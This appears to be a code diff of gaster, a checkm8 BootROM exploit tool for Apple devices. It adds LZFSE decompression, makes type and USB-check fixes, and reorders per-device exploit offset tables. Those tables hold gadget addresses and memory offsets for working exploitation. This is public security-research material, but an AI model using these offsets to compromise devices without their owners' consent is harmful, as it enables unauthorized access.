@@ -29,6 +29,7 @@
 #	include <IOKit/IOCFPlugIn.h>
 #	include <IOKit/usb/IOUSBLib.h>
 #endif
+#include "lzfse.h"
 #include <sys/mman.h>
 #include <sys/stat.h>
 
@@ -193,8 +194,7 @@ static const char *pwnd_str = " PWND:[gaster]";
 static der_item_spec_t der_img4_item_specs[] = {
 	{ 0, DER_IA5_STR, 0 },
 	{ 1, DER_SEQ, 0 }
-};
-static der_item_spec_t der_im4p_item_specs[] = {
+}, der_im4p_item_specs[] = {
 	{ 0, DER_IA5_STR, 0 },
 	{ 1, DER_IA5_STR, 0 },
 	{ 2, DER_IA5_STR, 0 },
@@ -270,11 +270,11 @@ usb_async_cb(struct libusb_transfer *transfer) {
 
 static bool
 send_usb_device_request(const usb_handle_t *handle, uint8_t bm_request_type, uint8_t b_request, uint16_t w_value, uint16_t w_index, void *p_data, size_t w_len, transfer_ret_t *transfer_ret) {
-	int ret = libusb_control_transfer(handle->device, bm_request_type, b_request, w_value, w_index, p_data, w_len, usb_timeout);
+	int ret = libusb_control_transfer(handle->device, bm_request_type, b_request, w_value, w_index, p_data, (uint16_t)w_len, usb_timeout);
 
 	if(transfer_ret != NULL) {
 		if(ret >= 0) {
-			transfer_ret->sz = ret;
+			transfer_ret->sz = (uint32_t)ret;
 			transfer_ret->ret = USB_TRANSFER_OK;
 		} else if(ret == LIBUSB_ERROR_PIPE) {
 			transfer_ret->ret = USB_TRANSFER_STALL;
@@ -621,22 +621,6 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			handle_interface_request = 0x10000CFB4;
 			usb_create_string_descriptor = 0x10000BFEC;
 			usb_serial_number_string_descriptor = 0x180080562;
-		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1992.0.0.1.19]") != NULL) {
-			cpid = 0x7000;
-			patch_addr = 0x100007E98;
-			memcpy_addr = 0x100010E70;
-			aes_crypto_cmd = 0x10000DA90;
-			io_buffer_addr = 0x18010D300;
-			boot_tramp_end = 0x1800E1000;
-			gUSBSerialNumber = 0x1800888C8;
-			dfu_handle_request = 0x180088878;
-			usb_core_do_transfer = 0x10000EBB4;
-			arch_task_tramp_addr = 0x10000D988;
-			insecure_memory_base = 0x180380000;
-			synopsys_routine_addr = 0x100005530;
-			handle_interface_request = 0x10000EEE4;
-			usb_create_string_descriptor = 0x10000E074;
-			usb_serial_number_string_descriptor = 0x18008062A;
 		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1991.0.0.2.16]") != NULL) {
 			cpid = 0x7001;
 			patch_addr = 0x10000AD04;
@@ -653,8 +637,24 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			handle_interface_request = 0x100011EE4;
 			usb_create_string_descriptor = 0x100011074;
 			usb_serial_number_string_descriptor = 0x180080C2A;
-		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2234.0.0.3.3]") != NULL) {
-			cpid = 0x8000;
+		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1992.0.0.1.19]") != NULL) {
+			cpid = 0x7000;
+			patch_addr = 0x100007E98;
+			memcpy_addr = 0x100010E70;
+			aes_crypto_cmd = 0x10000DA90;
+			io_buffer_addr = 0x18010D300;
+			boot_tramp_end = 0x1800E1000;
+			gUSBSerialNumber = 0x1800888C8;
+			dfu_handle_request = 0x180088878;
+			usb_core_do_transfer = 0x10000EBB4;
+			arch_task_tramp_addr = 0x10000D988;
+			insecure_memory_base = 0x180380000;
+			synopsys_routine_addr = 0x100005530;
+			handle_interface_request = 0x10000EEE4;
+			usb_create_string_descriptor = 0x10000E074;
+			usb_serial_number_string_descriptor = 0x18008062A;
+		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2234.0.0.2.22]") != NULL) {
+			cpid = 0x8003;
 			patch_addr = 0x10000812C;
 			ttbr0_addr = 0x1800C8000;
 			memcpy_addr = 0x100011030;
@@ -671,8 +671,8 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			handle_interface_request = 0x10000F1B0;
 			usb_create_string_descriptor = 0x10000E354;
 			usb_serial_number_string_descriptor = 0x1800807DA;
-		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2234.0.0.2.22]") != NULL) {
-			cpid = 0x8003;
+		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2234.0.0.3.3]") != NULL) {
+			cpid = 0x8000;
 			patch_addr = 0x10000812C;
 			ttbr0_addr = 0x1800C8000;
 			memcpy_addr = 0x100011030;
@@ -764,31 +764,6 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			handle_interface_request = 0x10000E08C;
 			usb_create_string_descriptor = 0x10000D234;
 			usb_serial_number_string_descriptor = 0x18008062A;
-		} else if(strstr(usb_serial_num, " SRTG:[iBoot-3401.0.0.1.16]") != NULL) {
-			cpid = 0x8012;
-			config_hole = 6;
-			config_overwrite_pad = 0x580;
-			tlbi = 0x100000494;
-			nop_gadget = 0x100008DB8;
-			ret_gadget = 0x10000012C;
-			patch_addr = 0x100004854;
-			ttbr0_addr = 0x18000C000;
-			func_gadget = 0x100008DA0;
-			write_ttbr0 = 0x100000444;
-			memcpy_addr = 0x10000EA30;
-			aes_crypto_cmd = 0x1000082AC;
-			boot_tramp_end = 0x18001C000;
-			ttbr0_vrom_off = 0x400;
-			ttbr0_sram_off = 0x600;
-			gUSBSerialNumber = 0x180003AF8;
-			dfu_handle_request = 0x180008B08;
-			usb_core_do_transfer = 0x10000BD20;
-			insecure_memory_base = 0x18001C000;
-			exit_critical_section = 0x10000FA00;
-			enter_critical_section = 0x10000F9B8;
-			handle_interface_request = 0x10000BFFC;
-			usb_create_string_descriptor = 0x10000B1CC;
-			usb_serial_number_string_descriptor = 0x18000082A;
 		} else if(strstr(usb_serial_num, " SRTG:[iBoot-3332.0.0.1.23]") != NULL) {
 			cpid = 0x8015;
 			config_hole = 6;
@@ -814,6 +789,31 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			handle_interface_request = 0x10000BCCC;
 			usb_create_string_descriptor = 0x10000AE80;
 			usb_serial_number_string_descriptor = 0x1800008FA;
+		} else if(strstr(usb_serial_num, " SRTG:[iBoot-3401.0.0.1.16]") != NULL) {
+			cpid = 0x8012;
+			config_hole = 6;
+			config_overwrite_pad = 0x580;
+			tlbi = 0x100000494;
+			nop_gadget = 0x100008DB8;
+			ret_gadget = 0x10000012C;
+			patch_addr = 0x100004854;
+			ttbr0_addr = 0x18000C000;
+			func_gadget = 0x100008DA0;
+			write_ttbr0 = 0x100000444;
+			memcpy_addr = 0x10000EA30;
+			aes_crypto_cmd = 0x1000082AC;
+			boot_tramp_end = 0x18001C000;
+			ttbr0_vrom_off = 0x400;
+			ttbr0_sram_off = 0x600;
+			gUSBSerialNumber = 0x180003AF8;
+			dfu_handle_request = 0x180008B08;
+			usb_core_do_transfer = 0x10000BD20;
+			insecure_memory_base = 0x18001C000;
+			exit_critical_section = 0x10000FA00;
+			enter_critical_section = 0x10000F9B8;
+			handle_interface_request = 0x10000BFFC;
+			usb_create_string_descriptor = 0x10000B1CC;
+			usb_serial_number_string_descriptor = 0x18000082A;
 		}
 		if(cpid != 0) {
 			*(bool *)pwned = strstr(usb_serial_num, pwnd_str) != NULL;
@@ -1467,7 +1467,7 @@ aes_256_cbc_decrypt(const uint8_t *key, const uint8_t *iv, const uint8_t *data_s
 	int out_sz;
 
 	if(ctx != NULL) {
-		ret = EVP_DecryptInit(ctx, EVP_aes_256_cbc(), key, iv) == 1 && EVP_CIPHER_CTX_set_padding(ctx, 0) == 1 && EVP_DecryptUpdate(ctx, data_dst, &out_sz, data_src, data_sz) == 1 && out_sz > 0 && (size_t)out_sz == data_sz && EVP_DecryptFinal(ctx, data_dst + out_sz, &out_sz) == 1 && out_sz == 0;
+		ret = EVP_DecryptInit(ctx, EVP_aes_256_cbc(), key, iv) == 1 && EVP_CIPHER_CTX_set_padding(ctx, 0) == 1 && EVP_DecryptUpdate(ctx, data_dst, &out_sz, data_src, (int)data_sz) == 1 && out_sz > 0 && (size_t)out_sz == data_sz && EVP_DecryptFinal(ctx, data_dst + out_sz, &out_sz) == 1 && out_sz == 0;
 		EVP_CIPHER_CTX_free(ctx);
 	}
 	return ret;
@@ -1484,23 +1484,38 @@ img4_decrypt(img4_t img4, uint8_t *kbag, uint8_t **dec, size_t *dec_sz) {
 		uint32_t magic, type, adler32, uncomp_sz, comp_sz;
 		uint8_t pad[COMP_HDR_PAD_SZ];
 	} comp_hdr;
+	const uint8_t *der, *der_end;
 	bool ret = false;
 	uint8_t *data;
+	uint64_t r;
 
-	if(img4.im4p.comp.buf == NULL && img4.im4p.data.len > sizeof(comp_hdr) && (data = malloc(img4.im4p.data.len)) != NULL) {
+	if(img4.im4p.data.len > sizeof(comp_hdr) && (data = malloc(img4.im4p.data.len)) != NULL) {
 		if(aes_256_cbc_decrypt(kbag + AES_BLOCK_SZ, kbag, img4.im4p.data.buf, data, img4.im4p.data.len)) {
-			memcpy(&comp_hdr, data, sizeof(comp_hdr));
-			if(comp_hdr.magic == __builtin_bswap32(COMP_HDR_MAGIC) && comp_hdr.type == __builtin_bswap32(COMP_HDR_TYPE_LZSS) && (comp_hdr.comp_sz = __builtin_bswap32(comp_hdr.comp_sz)) <= img4.im4p.data.len - sizeof(comp_hdr) && (comp_hdr.uncomp_sz = __builtin_bswap32(comp_hdr.uncomp_sz)) != 0 && (*dec = malloc(comp_hdr.uncomp_sz)) != NULL) {
-				if(decompress_lzss(data, comp_hdr.comp_sz, *dec, comp_hdr.uncomp_sz) == comp_hdr.uncomp_sz) {
-					*dec_sz = comp_hdr.uncomp_sz;
-					ret = true;
-				} else {
-					free(*dec);
+			if(img4.im4p.comp.buf != NULL) {
+				der = img4.im4p.comp.buf;
+				der_end = der + img4.im4p.comp.len;
+				if((der = der_decode_uint64(der, der_end, &r)) != NULL && r == 1 && der_decode_uint64(der, der_end, &r) != NULL && r != 0 && (*dec = malloc((size_t)r)) != NULL) {
+					if(lzfse_decode_buffer(*dec, (size_t)r, data, img4.im4p.data.len, NULL) == r) {
+						*dec_sz = (size_t)r;
+						ret = true;
+					} else {
+						free(*dec);
+					}
 				}
-			} else if((*dec = malloc(img4.im4p.data.len)) != NULL) {
-				memcpy(*dec, data, img4.im4p.data.len);
-				*dec_sz = img4.im4p.data.len;
-				ret = true;
+			} else {
+				memcpy(&comp_hdr, data, sizeof(comp_hdr));
+				if(comp_hdr.magic == __builtin_bswap32(COMP_HDR_MAGIC) && comp_hdr.type == __builtin_bswap32(COMP_HDR_TYPE_LZSS) && (comp_hdr.comp_sz = __builtin_bswap32(comp_hdr.comp_sz)) <= img4.im4p.data.len - sizeof(comp_hdr) && (comp_hdr.uncomp_sz = __builtin_bswap32(comp_hdr.uncomp_sz)) != 0 && (*dec = malloc(comp_hdr.uncomp_sz)) != NULL) {
+					if(decompress_lzss(data, comp_hdr.comp_sz, *dec, comp_hdr.uncomp_sz) == comp_hdr.uncomp_sz) {
+						*dec_sz = comp_hdr.uncomp_sz;
+						ret = true;
+					} else {
+						free(*dec);
+					}
+				} else if((*dec = malloc(img4.im4p.data.len)) != NULL) {
+					memcpy(*dec, data, img4.im4p.data.len);
+					*dec_sz = img4.im4p.data.len;
+					ret = true;
+				}
 			}
 		}
 		free(data);
@@ -1515,7 +1530,7 @@ gaster_command(usb_handle_t *handle, void *request_data, size_t request_len, uin
 
 	if(wait_usb_handle(handle, 0, 0, NULL, NULL)) {
 		if(send_usb_device_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LEN, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == DFU_FILE_SUFFIX_LEN && dfu_set_state_wait_reset(handle) && dfu_send_data(handle, request_data, request_len) && (*response = malloc(response_len)) != NULL) {
-			if(send_usb_device_request(handle, 0xA1, 2, 0xFFFF, 0, *response, response_len, NULL)) {
+			if(send_usb_device_request(handle, 0xA1, 2, 0xFFFF, 0, *response, response_len, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == response_len) {
 				ret = true;
 			} else {
 				free(*response);
